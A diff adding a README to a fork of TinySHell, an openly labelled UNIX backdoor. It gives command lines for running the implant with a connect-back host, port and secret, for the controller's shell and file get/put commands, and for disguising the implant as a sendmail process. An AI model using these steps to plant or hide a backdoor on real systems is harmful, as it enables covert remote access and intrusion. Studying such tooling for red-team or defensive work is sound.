@@ -1,4 +1,37 @@
+This is an updated fork of creaktives fork of TinySHell, an open source UNIX backdoor.
 
+creaktive added commandline argument parsing which allows you to dynamically set the connectback host, port, and shared secret value at runtime. 
+
+Like so:
+```
+# implant side
+Usage: ./tshd [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]
+
+# c2 side
+Usage: ./tsh [ -s secret ] [ -p port ] [command]
+
+   <hostname|cb>
+   <hostname|cb> get <source-file> <dest-dir>
+   <hostname|cb> put <source-file> <dest-dir>
+```
+
+I've since added support for passing those arguments through an environmental variable by shamelessly copy-pasting Skyper from The Hackers Choice's implementation of env2argv from the THC fork of dsniff. 
+
+So now you can do the following on the implant side:
+```
+ENV_ARGS="-c localhost -s HACKTHEPLANET -p 1437" ./tshd
+```
+
+Which is kinda cool, but it gets neater - you can hide the process somewhat with old school trickery like the following - making it look like a sendmail process as an example:
+```
+mv tshd sendmail
+PATH=.:$PATH ENV_ARGS="-c localhost -s HACKTHEPLANET -p 1437" sendmail 
+```
+
+Further changes will follow as testing proceeds and I refactor small bits, try out some bullshit, etc.
+
+
+## Original readme below.
 
                  Tiny SHell - An open-source UNIX backdoor
 
